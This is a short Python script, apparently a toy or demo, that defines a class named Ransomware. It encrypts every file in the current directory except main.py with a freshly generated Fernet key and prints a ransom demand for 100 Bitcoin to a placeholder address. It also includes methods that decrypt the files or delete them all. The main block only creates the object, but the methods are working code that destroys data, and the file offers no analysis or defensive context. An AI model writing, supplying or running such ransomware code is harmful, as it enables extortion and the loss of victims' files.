#!/usr/bin/env python3

from cryptography.fernet import Fernet
import os

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.files = [file for file in os.listdir() if file !=
                      "main.py" and os.path.isfile(file)] 

    def encrypt_files(self):
        for file in self.files:
            with open(file, "rb") as f:
                data = f.read()
            encrypted_data = Fernet(self.key).encrypt(data)
            with open(file, "wb") as f:
                f.write(encrypted_data)
        print("All of the files have been encrypted! Send me 100 Bitcoin to decrypt them!\n\"paste bitcoin address here\"\n")

    def decrypt_files(self):
        for file in self.files:
            with open(file, "rb") as f:
                data = f.read()
            decrypted_data = Fernet(self.key).decrypt(data)
            with open(file, "wb") as f:
                f.write(decrypted_data)
        print("all your files have been decrypted!\ngoodbye!")

    def delete_files(self):
        [os.remove(file) for file in self.files]
        print("all your files have been deleted!\ngoodbye!")


if __name__ == "__main__":
    ransomware = Ransomware()
